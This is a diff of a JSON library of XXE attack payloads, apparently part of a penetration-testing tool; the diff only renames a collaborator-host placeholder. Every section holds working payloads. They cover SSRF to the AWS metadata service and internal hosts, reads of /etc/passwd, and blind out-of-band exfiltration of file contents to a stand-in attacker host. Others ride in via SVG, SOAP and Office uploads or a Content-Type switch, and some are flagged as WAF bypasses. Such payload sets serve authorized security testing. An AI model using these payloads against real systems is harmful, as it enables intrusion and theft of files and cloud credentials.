@@ -19,7 +19,7 @@
       "description": "XXE payloads for Server-Side Request Forgery via external entities",
       "payloads": [
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>", "description": "XXE SSRF to AWS IMDSv1", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLABORATOR_URL/\">]><root>&xxe;</root>", "description": "XXE SSRF to Collaborator for OOB detection", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLABORATOR/\">]><root>&xxe;</root>", "description": "XXE SSRF to Collaborator for OOB detection", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/internal/api\">]><root>&xxe;</root>", "description": "XXE SSRF to internal service", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.1/\">]><root>&xxe;</root>", "description": "XXE SSRF to internal network gateway", "waf_bypass": false}
       ]
@@ -27,17 +27,17 @@
     "blind_oob": {
       "description": "Blind XXE payloads using out-of-band data exfiltration",
       "payloads": [
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/evil.dtd\"> %xxe;]><root>test</root>", "description": "Blind XXE loading external DTD from Collaborator (replace COLLABORATOR_URL via generate_collaborator_payload)", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://COLLABORATOR_URL/exfil.dtd\"> %dtd;]><root>test</root>", "description": "Blind XXE two-stage: loads external DTD that defines entity using %file; — DTD content: <!ENTITY % eval \"<!ENTITY send SYSTEM 'http://COLLABORATOR_URL/?x=%file;'>\"> %eval;", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"ftp://COLLABORATOR_URL:21/data\"> %xxe;]><root>test</root>", "description": "Blind XXE via FTP for slow-read data exfiltration (Collaborator)", "waf_bypass": false},
-        {"payload": "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://COLLABORATOR_URL/?x=%file;'>\">%eval;%exfiltrate;", "description": "External DTD content for OOB file exfiltration (deploy on Collaborator-served evil.dtd)", "waf_bypass": false}
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR/evil.dtd\"> %xxe;]><root>test</root>", "description": "Blind XXE loading external DTD from Collaborator (replace COLLABORATOR via generate_collaborator_payload)", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://COLLABORATOR/exfil.dtd\"> %dtd;]><root>test</root>", "description": "Blind XXE two-stage: loads external DTD that defines entity using %file; — DTD content: <!ENTITY % eval \"<!ENTITY send SYSTEM 'http://COLLABORATOR/?x=%file;'>\"> %eval;", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"ftp://COLLABORATOR:21/data\"> %xxe;]><root>test</root>", "description": "Blind XXE via FTP for slow-read data exfiltration (Collaborator)", "waf_bypass": false},
+        {"payload": "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://COLLABORATOR/?x=%file;'>\">%eval;%exfiltrate;", "description": "External DTD content for OOB file exfiltration (deploy on Collaborator-served evil.dtd)", "waf_bypass": false}
       ]
     },
     "parameter_entity": {
       "description": "XXE payloads using XML parameter entities for advanced exploitation",
       "payloads": [
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/evil.dtd\"> %xxe; %payload; %send;]><root>test</root>", "description": "Parameter entity chain loading external DTD (Collaborator)", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo SYSTEM \"http://COLLABORATOR_URL/evil.dtd\"><root>test</root>", "description": "External DOCTYPE for blind XXE via SYSTEM identifier (Collaborator)", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR/evil.dtd\"> %xxe; %payload; %send;]><root>test</root>", "description": "Parameter entity chain loading external DTD (Collaborator)", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo SYSTEM \"http://COLLABORATOR/evil.dtd\"><root>test</root>", "description": "External DOCTYPE for blind XXE via SYSTEM identifier (Collaborator)", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> %local_dtd;]><root>&ISOtech;</root>", "description": "Error-based XXE repurposing local DTD file", "waf_bypass": true},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE message [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\">]><message>&start;&file;&end;</message>", "description": "CDATA wrapping to handle special chars in exfiltrated data", "waf_bypass": false}
       ]
@@ -47,30 +47,30 @@
       "payloads": [
         {"payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>", "description": "XInclude file read /etc/passwd", "waf_bypass": false},
         {"payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/hostname\"/></foo>", "description": "XInclude file read /etc/hostname", "waf_bypass": false},
-        {"payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://COLLABORATOR_URL/xxe\"/></foo>", "description": "XInclude SSRF to external server", "waf_bypass": false}
+        {"payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://COLLABORATOR/xxe\"/></foo>", "description": "XInclude SSRF to external server", "waf_bypass": false}
       ]
     },
     "svg_xxe": {
       "description": "XXE via SVG file upload — SVG is XML so entity declarations execute during server-side parsing",
       "payloads": [
         {"payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>", "description": "SVG XXE file read", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"http://COLLABORATOR_URL/svg-xxe\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>", "description": "SVG XXE SSRF to Collaborator", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/evil.dtd\"> %xxe;]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>test</text></svg>", "description": "SVG XXE blind OOB via parameter entity", "waf_bypass": false}
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"http://COLLABORATOR/svg-xxe\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>", "description": "SVG XXE SSRF to Collaborator", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR/evil.dtd\"> %xxe;]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>test</text></svg>", "description": "SVG XXE blind OOB via parameter entity", "waf_bypass": false}
       ]
     },
     "soap_xxe": {
       "description": "XXE in SOAP envelopes — common in enterprise web services",
       "payloads": [
         {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>", "description": "SOAP XXE file read", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/soap-xxe\"> %xxe;]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>x</test></soap:Body></soap:Envelope>", "description": "SOAP XXE blind OOB", "waf_bypass": false}
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR/soap-xxe\"> %xxe;]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>x</test></soap:Body></soap:Envelope>", "description": "SOAP XXE blind OOB", "waf_bypass": false}
       ]
     },
     "office_xxe": {
       "description": "XXE via Office/Excel XML files — OOXML formats (.docx, .xlsx, .pptx) contain XML that may be parsed server-side",
       "payloads": [
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLABORATOR_URL/xlsx-xxe\">]><workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId1\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">&xxe;</sheet></sheets></workbook>", "description": "XXE in xl/workbook.xml inside .xlsx — replace in ZIP archive and upload", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLABORATOR/xlsx-xxe\">]><workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId1\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">&xxe;</sheet></sheets></workbook>", "description": "XXE in xl/workbook.xml inside .xlsx — replace in ZIP archive and upload", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"&xxe;\"/></Types>", "description": "XXE in [Content_Types].xml inside OOXML — parsed first by most libraries", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/docx-xxe\"> %xxe;]><document xmlns=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><body><p><r><t>test</t></r></p></body></document>", "description": "XXE in word/document.xml inside .docx — blind OOB via parameter entity", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR/docx-xxe\"> %xxe;]><document xmlns=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><body><p><r><t>test</t></r></p></body></document>", "description": "XXE in word/document.xml inside .docx — blind OOB via parameter entity", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><styleSheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><fonts><font><name val=\"&xxe;\"/></font></fonts></styleSheet>", "description": "XXE in xl/styles.xml inside .xlsx — often parsed without entity restrictions", "waf_bypass": false}
       ]
     },
@@ -79,7 +79,7 @@
       "payloads": [
         {"payload": "Content-Type: application/xml\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><key>&xxe;</key></root>", "description": "Switch Content-Type from application/json to application/xml — many frameworks auto-detect", "waf_bypass": false},
         {"payload": "Content-Type: text/xml\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><key>&xxe;</key></root>", "description": "Use text/xml Content-Type — alternate XML MIME type that may bypass filters", "waf_bypass": true},
-        {"payload": "Content-Type: application/xml\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/json-to-xml\"> %xxe;]><root>test</root>", "description": "Blind XXE via Content-Type switch — JSON endpoint parses XML with external entities", "waf_bypass": false},
+        {"payload": "Content-Type: application/xml\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR/json-to-xml\"> %xxe;]><root>test</root>", "description": "Blind XXE via Content-Type switch — JSON endpoint parses XML with external entities", "waf_bypass": false},
         {"payload": "Content-Type: application/soap+xml\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><Envelope><Body>&xxe;</Body></Envelope>", "description": "SOAP Content-Type on REST endpoint — some frameworks route to XML parser", "waf_bypass": true}
       ]
     }
